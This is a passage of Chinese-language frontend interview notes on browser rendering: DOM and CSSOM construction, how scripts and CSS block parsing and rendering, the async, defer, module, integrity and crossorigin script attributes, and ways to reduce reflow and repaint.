    其中，img的加载不会阻塞html的解析，但img加载后并不渲染，它需要等待Render Tree生成完后才和Render Tree一起渲染出来。未下载完的图片需等下载完后才渲染。

    (1) 浏览器会将HTML解析成一个DOM树，DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。 构建DOM树

    (2) 将CSS解析成 CSS Rule Tree。 构建CSS规则树

    (3) 根据DOM树和CSSOM来构造 Rendering Tree。注意：Rendering Tree 渲染树并不等同于 DOM 树，因为一些像Header或display:none的东西就没必要放在渲染树中了。 构建渲染树

    (4) 有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。下一步操作称之为layout，顾名思义就是计算出每个节点在屏幕中的位置。 渲染树计算

    (5) 再下一步就是绘制，即遍历render树，并使用UI后端层绘制每个节点。 渲染树绘制

    注意：上述这个过程是逐步完成的，为了更好的用户体验，渲染引擎将会尽可能早的将内容呈现到屏幕上，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。
    ![渲染树](https://github.com/fang-bin/interview/blob/master/image/render.jpeg)
    **简单来说**：浏览器通过解析HTML，生成DOM树，解析CSS，生成CSS规则树，然后通过DOM树和CSS规则树生成渲染树。渲染树与DOM树不同，渲染树中并没有head、display为none等不必显示的节点。根据渲染树计算每个节点在屏幕中的位置。最后进行绘制

    要注意的是，浏览器的解析过程并非是串连进行的，比如在解析CSS的同时，可以继续加载解析HTML，但在解析执行JS脚本时，会停止解析后续HTML，这就会出现阻塞问题

    **渲染阻塞**

    当浏览器遇到一个 script 标记时，DOM 构建将暂停，直至脚本完成执行，然后继续构建DOM。每次去执行JavaScript脚本都会严重地阻塞DOM树的构建，如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM还没有下载和构建，浏览器甚至会延迟脚本执行和构建DOM，直至完成其CSSOM的下载和构建。

### script和css阻塞和解决方案

#### script加载解析
直接使用script脚本的话，html会按照顺序来加载并执行脚本，在脚本加载&执行的过程中，会阻塞后续的DOM渲染。defer 和 async 都只适用于外部脚本文件，对与内联的 script 标签是不起作用。

**`<script src="script.js"></script>`**

没有 defer 或 async，浏览器会立即加载并执行指定的脚本，“立即”指的是在渲染该 script 标签之下的文档元素之前，也就是说不等待后续载入的文档元素，读到就加载并执行。

**`<script async src="script.js"></script>`**

有 async，加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。

**`<script defer src="script.js"></script>`**

有 defer，加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成。

**`<script type="module" src="script.js"></script>`**

type 为 module 的 script 标签将被当作一个 JavaScript 模块对待，被称为 module script，且不受 charset 和 defer 属性影响，**都是异步加载，不会造成堵塞浏览器，即等到整个页面渲染完，再执行模块脚本，等同于打开了script标签的defer属性。模块中自动采用严格模式，不管用没有声明`use strict`，而且同一个模块加载多次，都只执行一次。**

支持 module script 的浏览器，不会执行拥有 nomodule 属性的 script。

不支持 module script 的浏览器，会忽略未知的 type="module" 的 script，同时也会忽略传统 script 中不认识的 nomodule 属性，进而执行传统的 bundle.js 代码。

module script 以及其依赖所有文件（源文件中通过 import 声明导入的文件）都会被下载，一旦整个依赖的模块树都被导入，页面文档也完成解析，app.js 将会被执行。

但是如果 module script 里有 async 属性，比如 `<script type="module" src="util.js" async></script>` ，module script 及其所有依赖都会异步下载，待整个依赖的模块树都被导入时会立即执行，而此时页面有可能还没有完成解析渲染。

![script加载](https://github.com/fang-bin/interview/blob/master/image/script-load.jpeg)

蓝色线代表网络读取，红色线代表执行时间，这俩都是针对脚本的；绿色线代表 HTML 解析。

此图告诉我们以下几个要点：

* defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）
* 它俩的差别在于脚本下载完之后何时执行，显然 defer 是最接近我们对于应用脚本加载和执行的要求的
* 关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的，这一点要善加利用
* async 则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行
* 仔细想想，async 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics

#### script 标签的 integrity 属性

integrity 属性是资源完整性规范的一部分，它允许你为 script 提供一个 hash，用来进行验签，检验加载的JavaScript 文件是否完整。

```html
<script crossorigin="anonymous" integrity="sha256-PJJrxrJLzT6CCz1jDfQXTRWOO9zmemDQbmLtSlFQluc=" src="https://assets-cdn.github.com/assets/frameworks-3c926bc6b24bcd3e820b3d630df4174d158e3bdce67a60d06e62ed4a515096e7.js"></script>
```

上面的代码来自github源码，integrity="sha256-PJJrxrJLzT6CCz1jDfQXTRWOO9zmemDQbmLtSlFQluc=" 告诉浏览器，使用sha256签名算法对下载的js文件进行计算，并与intergrity提供的摘要签名对比，如果二者不一致，就不会执行这个资源。

intergrity 的作用有：
* 减少由【托管在CDN的资源被篡改】而引入的XSS 风险
* 减少通信过程资源被篡改而引入的XSS风险（同时使用https会更保险）
* 可以通过一些技术手段，不执行有脏数据的CDN资源，同时去源站下载对应资源

#### script 标签的 crossorigin 属性
crossorigin 的属性值可以是 anonymous、use-credentials，如果没有属性值或者非法属性值，会被浏览器默认做anonymous。

crossorigin的作用有三个：

* crossorigin 会让浏览器启用CORS访问检查，检查http相应头的 Access-Control-Allow-Origin
* 对于传统 script 需要跨域获取的js资源，控制暴露出其报错的详细信息
* 对于 module script ，控制用于跨域请求的凭据模式

通过使用 crossorigin 属性可以使跨域js暴露出跟同域js同样的报错信息。但是，资源服务器必须返回一个 Access-Control-Allow-Origin 的header，否则资源无法访问。

#### js动态添加 script 标签

可以用js将script动态的append到文档当中，其会异步执行（可以理解为默认拥有async属性），如果需要加载的js按顺序执行，需要设置async为false。

注意：通过 innerHTML 动态添加到页面上的 script 标签则不会被执行。

#### css加载解析
* css加载不会阻塞Dom树的解析
* css加载会阻塞DOM树的渲染（因为，如果没有CSSOM,先对DOM树进行渲染，DOM树后面可能需要重新绘制或回流，造成一些没必要的损耗）
* css加载会阻塞后面js语句的执行（如果样式下载受阻，那么也将阻塞后面js的下载和执行，因为script脚本在执行过程中可能会引用到相关样式）

#### css和javascript加载总结

CSS 优先：引入顺序上，CSS 资源先于 JavaScript 资源。JS置后：我们通常把JS代码放到页面底部，且JavaScript 应尽量少影响 DOM 的构建。

当解析html的时候，会把新来的元素插入dom树里面，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序去匹配的。

例如： div p {font-size: 16px}，会先寻找所有p标签并判断它的父标签是否为div之后才会决定要不要采用这个样式进行渲染）。所以，我们平时写CSS时，尽量用id和class，千万不要过渡层叠。

根据渲染树布局，计算CSS样式，即每个节点在页面中的大小和位置等几何信息。HTML默认是流式布局的，CSS和js会打破这种布局，改变DOM的外观样式以及大小和位置。这时就要提到两个重要概念：replaint和reflow。

**replaint（重绘）**：屏幕的一部分重画，不影响整体布局，比如某个CSS的背景色变了，但元素的几何尺寸和位置不变。

**reflow（回流/重排）**：意味着元件的几何尺寸变了，我们需要重新验证并计算渲染树。是渲染树的一部分或全部发生了变化。这就是Reflow，或是Layout。

reflow 会从 这个 root frame 开始递归往下，依次计算所有的结点几何尺寸和位置。reflow 几乎是无法避免的。现在界面上流行的一些效果，比如树状目录的折叠、展开（实质上是元素的显 示与隐藏）等，都将引起浏览器的 reflow。鼠标滑过、点击……只要这些行为引起了页面上某些元素的占位面积、定位方式、边距等属性的变化，都会引起它内部、周围甚至整个页面的重新渲 染。通常我们都无法预估浏览器到底会 reflow 哪一部分的代码，它们都彼此相互影响着。

注意：

* display:none 的节点不会被加入Render Tree，而visibility: hidden 则会，所以，如果某个节点最开始是不显示的，设为display:none是更优的。
* display:none 会触发 reflow，而 visibility:hidden 只会触发 repaint，因为没有发现位置变化。
* 某些情况下，比如修改了元素的样式，浏览器并不会立刻reflow 或 repaint 一次，而是会把这样的操作积攒一批，然后做一次 reflow，这又叫异步 reflow 或增量异步 reflow。但是在有些情况下，比如resize 窗口，改变了页面默认的字体等。对于这些操作，浏览器会马上进行 reflow。

**重排必定会引发重绘，但重绘不一定会引发重排。**

触发重排的条件：任何页面布局和几何属性的改变都会触发重排，比如：

* 页面渲染初始化；(无法避免)
* 添加或删除可见的DOM元素；
* 元素位置的改变，或者使用动画；
* 元素尺寸的改变——大小，外边距，边框；
* 浏览器窗口尺寸的变化（resize事件发生时）；
* 填充内容的改变，比如文本的改变或图片大小改变而引起的计算值宽度和高度的改变；
* 读取某些元素属性：（offsetLeft/Top/Height/Width,　clientTop/Left/Width/Height,　scrollTop/Left/Width/Height,　width/height,　getComputedStyle(),　currentStyle(IE)　)

**重绘重排的代价：耗时，导致浏览器卡慢。**

**优化**

浏览器有自己的优化，浏览器会维护1个队列，把所有会引起回流、重绘的操作放入这个队列，等队列中的操作到了一定的数量或者到了一定的时间间隔，浏览器就会flush队列，进行一个批处理。这样就会让多次的回流、重绘变成一次回流重绘。

我们要减少重绘和重排就是要减少对渲染树的操作，则我们可以合并多次的DOM和样式的修改。并减少对style样式的请求。

* 直接改变元素的className
* display：none；先设置元素为display：none；然后进行页面布局等操作；设置完成后将元素设置为display：block；这样的话就只引发两次重绘和重排；
* 不要经常访问浏览器的flush队列属性；如果一定要访问，可以利用缓存。将访问的值存储起来，接下来使用就不会再引发回流；
* 使用cloneNode(true or false) 和 replaceChild 技术，引发一次回流和重绘；
* 将需要多次重排的元素，position属性设为absolute或fixed，元素脱离了文档流，它的变化不会影响到其他元素；
* 如果需要创建多个DOM节点，可以使用DocumentFragment创建完后一次性的加入document；
* 尽量不要使用table布局。


###### 参考
[「一道面试题」输入URL到渲染全面梳理上-网络通信篇](https://juejin.im/post/5e9c48b2f265da47c558566b)
[「一道面试题」输入URL到渲染全面梳理中-页面渲染篇](https://juejin.im/post/5e9f1db86fb9a03c85463560)
